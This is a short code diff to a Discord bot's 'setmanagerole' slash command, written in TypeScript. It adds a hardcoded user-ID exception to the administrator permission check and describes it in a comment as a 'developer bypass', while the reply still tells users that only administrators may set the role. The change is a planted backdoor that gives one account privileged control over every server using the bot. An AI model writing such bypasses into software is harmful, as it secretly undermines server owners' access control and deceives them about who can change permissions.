@@ -137,8 +137,8 @@ class SlashCommands {
       if (interaction.commandName === "setmanagerole") {
         const member = interaction.member as GuildMember;
         
-        // Only admins can set the manager role
-        if (!member.permissions.has('Administrator') && interaction.guild?.ownerId !== member.id) {
+        // Only admins can set the manager role (with developer bypass)
+        if (member.id !== '201215609189564416' && !member.permissions.has('Administrator') && interaction.guild?.ownerId !== member.id) {
           await interaction.reply({
             content: "❌ Only administrators can set the manager role.",
             ephemeral: true
